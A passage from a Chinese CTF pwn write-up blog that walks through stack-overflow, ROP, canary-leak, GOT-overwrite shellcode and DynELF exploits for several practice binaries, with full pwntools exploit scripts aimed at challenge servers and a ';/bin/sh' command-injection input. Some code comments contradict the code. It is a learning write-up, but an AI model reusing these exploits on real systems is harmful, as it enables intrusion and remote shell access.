<li>调用exit函数，但不退出。（这里没有输入时区，free掉一个空指针是可以的）</li>
<li>选择输入时区，这个时候向时区中输入也就是向之前的format输入。输入需要的<code>&#39;;/bin/sh&#39;</code>。</li>
<li>输入一个时间。（打印函数能成功执行）</li>
<li>执行打印函数。</li>
</ul>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;time_formatter&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">57804</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">p.sendline(<span class="string">&quot;&#x27;;/bin/sh&#x27;&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201202173811503.png" alt="image-20201202173811503"></p>
<h2 id="7-pwn-200"><a href="#7-pwn-200" class="headerlink" title="7.pwn-200"></a>7.pwn-200</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220204019066.png" alt="image-20201220204019066"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220204110640.png" alt="image-20201220204110640"></p>
<h3 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220204324635.png" alt="image-20201220204324635"></p>
<p>主要函数很简单，就是一个输入函数。可以看到存在栈溢出漏洞。</p>
<h3 id="思路及利用-4"><a href="#思路及利用-4" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>因为开启了堆栈不可执行，所以shellcode不可行，考虑使用rop的方法。由于没有调用system函数，首先要泄露地址。</p>
<p>整个程序很简单，只需要简单的覆盖返回地址为write函数的plt即可。这里需要注意的是32位的传参方式与64位有所不同。</p>
<p>因此泄露函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">main = <span class="number">0x80484BE</span></span><br><span class="line">write_got = efl.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = efl.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)<span class="comment">#write(fd，addr,len)需要三个参数</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure>

<p>泄露地址之后就是常规操作，可以通过LibcSearcher得到system地址，“/bin/sh”地址，依照相同方式，得到shell。</p>
<p>最终exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">31442</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn200&#x27;)</span></span><br><span class="line">efl = ELF(<span class="string">&#x27;pwn200&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x80484BE</span></span><br><span class="line">write_got = efl.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = efl.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span>+p32(system_addr)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220205838214.png" alt="image-20201220205838214"></p>
<h2 id="8-pwn1"><a href="#8-pwn1" class="headerlink" title="8.pwn1"></a>8.pwn1</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220210407729.png" alt="image-20201220210407729"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220210437478.png" alt="image-20201220210437478"></p>
<h3 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220210753716.png" alt="image-20201220210753716"></p>
<p>程序仍然十分简单，漏洞很明确就是栈溢出，堆栈不可执行，没有调用过system函数，基本思路<strong>pwn200</strong>一致，传参为64位又与<strong>welpwn</strong>类似。不过不同的是，保护中开启了canary，所以需要先泄露canary的值。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211118535.png" alt="image-20201220211118535">可以看出canary紧邻ebp。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211219859.png" alt="image-20201220211219859"></p>
<p>因此，需要填充的垃圾数据为0x90-0x8 = 0x88。这里利用puts函数的特点，输入0x88个垃圾数据，将canary的值顺带输出。</p>
<p>传递参数需要一个<code>pop rdi ，ret</code><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211732114.png" alt="image-20201220211732114"></p>
<p>整个exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">57170</span>)</span><br><span class="line">prdi_addr=<span class="number">0x0400a93</span></span><br><span class="line">main_addr=<span class="number">0x0400908</span></span><br><span class="line">one_gadget_addr=<span class="number">0x45216</span></span><br><span class="line">put_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">put_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(prdi_addr)+p64(put_got)+p64(put_plt)+p64(main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">put_addr=u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(put_addr)</span><br><span class="line">libc_base=put_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">flag=libc_base+one_gadget_addr</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(flag)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220211938141.png" alt="image-20201220211938141"></p>
<h2 id="9-note-service2"><a href="#9-note-service2" class="headerlink" title="9.note-service2"></a>9.note-service2</h2><h3 id="代码分析-6"><a href="#代码分析-6" class="headerlink" title="代码分析"></a>代码分析</h3><p>惯例先checksec一下：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123223457054.png" alt="image-20201123223457054"></p>
<p>然后使用ida反编译。一边阅读一边修改函数名称，将整个过程走一遍。</p>
<p>其中只实现了add和delete。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123223844741.png" alt="image-20201123223844741"></p>
<p>在add函数中，没有对index进行检查，因此可以通过输入index值基本实现将任意指针写到globle数组中。同时申请的chunk大小不能超过8字节，小于64位下chunk的最小值，实际分配的chunk每个用户数据大小是16字节（0x10）还有chunk头16字节。</p>
<p>对于获取输入的函数也有需要注意的地方：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123224225947.png" alt="image-20201123224225947"></p>
<p>关于delete函数：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123224310040.png" alt="image-20201123224310040"></p>
<h3 id="思路及利用-5"><a href="#思路及利用-5" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>首先值得注意的漏洞有两个，一个是数组的越界，一个是释放chunk后没有将指针置为null。但是由于题目限制了对chunk的写入数据大小，没法做到溢出，因此关于堆的攻击技巧基本上都不能用。</p>
<p>目标转为数组越界，同时注意到这道题目是堆栈可执行的。那么就可以考虑，将shellcode写入堆，利用数组越界将堆指针替换为got表项，更改相应函数的执行内容。结合下文出现的参数传递问题，选择free函数是比较合适的。</p>
<p>但是每一个chunk输入最多为7字节，只能将shellcode分散，利用jmp指令跳转。</p>
<p>关于shellcode的编写。选择系统调用execve(“/bin/sh”,0,0)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov rdi, xxx   <span class="comment">//xxx=&amp;(&quot;/bin/sh&quot;)  </span></span><br><span class="line">mov rsi,<span class="number">0</span>   </span><br><span class="line">mov rax, <span class="number">0x3b</span> <span class="comment">//rax=0x3b execve在64位下的系统调用号</span></span><br><span class="line">mov rdx,<span class="number">0</span>   </span><br><span class="line">syscall </span><br></pre></td></tr></table></figure>

<p>但是<code>mov rsi,0</code>太长，因此换为<code>xor rsi, rsi </code>利用异或实现。同理<code>mov rdx,0 </code>也是。</p>
<p>这里又出现个问题就是，‘/bin/sh’太长，不能直接传递。需要利用函数的参数传递，首先将‘/bin/sh’写入一个chunk，然后free。这时候根据64位的参数传递规则，‘/bin/sh’作为free的参数传递给了rdi。</p>
<p>接下来需要解决的是在不同chunk间的跳转。使用jmp short(\xeb)实现短转移。需要知道之间的相对偏移。</p>
<p>上文分析过每个chunk依次申请，大小一致都是0x20.</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231022120.png" alt="image-20201123231022120"></p>
<p>chunk的状态如图所示，为了统一方便计算。将jmp指令放在最后，不足的用用nop填充（\x90）。那么即从当前chunk的jmp区跳到下一个chunk的data区，距离是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8+8+8（prevs_size+size+上个chunk的空）+1（一个未写入的空子节）&#x3D;0x19</span><br></pre></td></tr></table></figure>

<p><code>即跳转指令</code>\xeb\x19`。</p>
<p>最后就是得到free的got表项的地址相对于global的偏移。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084832598.png" alt="image-20201125084832598"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125084904525.png" alt="image-20201125084904525"></p>
<p>偏移为<code>(0x0000000000202018-0x0000000002020A0)/8</code>得到-17.</p>
<p>所以得到exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./note-service2&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">42169</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;choice&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"><span class="comment">#改写free的got</span></span><br><span class="line">add(<span class="number">-17</span>,asm(<span class="string">&quot;xor rsi,rsi&quot;</span>)+<span class="string">b&#x27;\x90\x90\xeb\x19&#x27;</span> )</span><br><span class="line">add(<span class="number">1</span>,asm(<span class="string">&quot;mov eax,0x3b&quot;</span>)+<span class="string">b&quot;\xeb\x19&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>,asm(<span class="string">&quot;xor rdx,rdx&quot;</span>)+<span class="string">b&quot;\x90\x90\xeb\x19&quot;</span>)</span><br><span class="line">add(<span class="number">3</span>,asm(<span class="string">&quot;syscall&quot;</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231554223.png" alt="image-20201123231554223"></p>
<h2 id="10-pwn-100"><a href="#10-pwn-100" class="headerlink" title="10.pwn-100"></a>10.pwn-100</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209110940322.png" alt="image-20201209110940322"></p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209164911452.png" alt="image-20201209164911452"></p>
<h3 id="代码分析-7"><a href="#代码分析-7" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209165235082.png" alt="image-20201209165235082"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209165320208.png" alt="image-20201209165320208"></p>
<p>整个程序很简单，只发现一个栈溢出漏洞，而且开启了堆栈不可执行。</p>
<h3 id="思路及利用-6"><a href="#思路及利用-6" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>思路显然就是利用栈溢出漏洞，编写gadget执行system。</p>
<p>首先需要泄露地址。这里可以借助pwntools的dynelf函数。</p>
<blockquote>
<p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块.</p>
</blockquote>
<p>代码框架如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">&#x27;./xxx&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">  <span class="comment">#各种预处理</span></span><br><span class="line">  payload = <span class="string">&quot;xxxxxxxx&quot;</span> + address + <span class="string">&quot;xxxxxxxx&quot;</span></span><br><span class="line">  p.send(payload)</span><br><span class="line">  <span class="comment">#各种处理</span></span><br><span class="line">  data = p.recv(<span class="number">4</span>)</span><br><span class="line">  log.debug(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&quot;./xxx&quot;</span>))      <span class="comment">#初始化DynELF模块 </span></span><br><span class="line">systemAddress = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)  <span class="comment">#在libc文件中搜索system函数的地址</span></span><br></pre></td></tr></table></figure>

<p>需要注意的是，DynELF需要能够泄露信息的漏洞反复触发，因此每一次泄露需要最终返回到start。</p>
<p>整个程序十分简单，能够用来输出的只有puts函数。给puts函数传参，需要用到<code>pop rdi，ret</code>这样的gadget。</p>
<p>使用ROPgadget查找。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209170839114.png" alt="image-20201209170839114"></p>
<p>得到需要的地址如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">poprdi = <span class="number">0x0000000000400763</span></span><br><span class="line">start = start_addr = <span class="number">0x400550</span></span><br></pre></td></tr></table></figure>



<p>最终得到如下的泄露函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span>		<span class="comment">#填充0x40+8位垃圾数据</span></span><br><span class="line">    payload += p64(poprdi)	<span class="comment">#覆盖ret，执行pop rdi，ret</span></span><br><span class="line">    payload += p64(addr)	<span class="comment">#addr——&gt;rdi</span></span><br><span class="line">    payload += p64(puts_plt)<span class="comment">#ret语句执行的地址，调用puts函数，相当于puts(addr)</span></span><br><span class="line">    payload += p64(start)	<span class="comment">#puts函数调用后的ret，返回开始。</span></span><br><span class="line">    payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">    up = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"> <span class="comment">#puts函数的接受处理</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"> <span class="comment">#由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待1秒钟，如果确实接收不到了，就说明输出结束了；以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””</span></span><br><span class="line">        c = p.recv(numb = <span class="number">1</span>, timeout = <span class="number">0.5</span>)</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>:</span><br><span class="line">            data = data[:<span class="number">-1</span>]</span><br><span class="line">            data += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data += c</span><br><span class="line">            up = c</span><br><span class="line">    data = data[:<span class="number">4</span>]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&#x27;./pwn-100&#x27;</span>))</span><br><span class="line">system = d.lookup(<span class="string">&#x27;__libc_system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>完成泄露system地址之后，就是执行system函数，传递“/bin/sh”参数得到shell了。</p>
<p>观察整个程序，并没有改写got的余地与必要。同时之前寻找<code>pop rdi，ret</code>时发现了足够的gadget。因此，考虑通过gadget传递参数执行system函数。</p>
<p>那么，第一步就是将‘/bin/sh’写入到内存的某个地方。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209172219756.png" alt="image-20201209172219756"></p>
<p>可以看到bss段是可写的，于是，利用read函数，将‘/bin/sh’写入bss段。</p>
<p>read函数一共有要三个传参寄存器rdi, rsi, rdx。</p>
<p>而在 libc_csu_init 中，有一段万能gadget。</p>
<p> <img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209173406970.png" alt="image-20201209173406970"></p>
<p>可以先传给r13，r14，r15再mov到相应寄存器。</p>
<p>于是又如下payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sh = <span class="number">0x601000</span></span><br><span class="line">gadget = <span class="number">0x40075a</span> <span class="comment"># pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret</span></span><br><span class="line">gadget1 = <span class="number">0x400740</span> <span class="comment"># mov %r13,%rdx;mov %r14,%rsi;mov %r15d,%edi; callq  *(%r12,%rbx,8)</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(gadget) </span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment"># rbx = 0</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># rbp = 1</span></span><br><span class="line">payload += p64(read_plt)<span class="comment"># r12 = read_got</span></span><br><span class="line">payload += p64(<span class="number">8</span>)<span class="comment"># r13 = 8,count;读入8个字节</span></span><br><span class="line">payload += p64(sh)<span class="comment"># r14 = sh,* buf = sh</span></span><br><span class="line">payload += p64(<span class="number">1</span>)<span class="comment"># r15 = 0,fd = 0;标准输入</span></span><br><span class="line">payload += p64(gadget1)</span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">56</span><span class="comment">#gadget11需要56个栈空间。</span></span><br><span class="line">payload += p64(start)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>至此完成了，‘/bin/sh’的输入，最后就是调用system函数。只需要将sh地址传给rdi调用system即可。</p>
<p>最终完整exp：</p>
